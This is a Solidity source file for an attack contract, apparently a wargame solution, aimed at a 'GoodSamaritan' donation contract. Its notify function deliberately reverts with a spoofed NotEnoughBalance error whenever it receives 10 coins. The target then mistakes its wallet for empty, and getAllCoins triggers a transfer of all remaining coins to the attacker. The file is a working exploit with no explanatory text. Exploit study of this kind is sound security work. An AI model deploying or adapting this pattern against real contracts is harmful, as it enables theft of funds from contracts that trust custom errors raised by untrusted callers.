// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

interface GoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

contract GoodSamaritanAttack {
    GoodSamaritan goodSamaritanContract;
    error NotEnoughBalance();

    constructor(address _goodSamaritanAddress) {
        goodSamaritanContract = GoodSamaritan(_goodSamaritanAddress);
    }

    function notify(uint256 _amount) external {
        if (_amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function getAllCoins() public {
        goodSamaritanContract.requestDonation();
    }
}
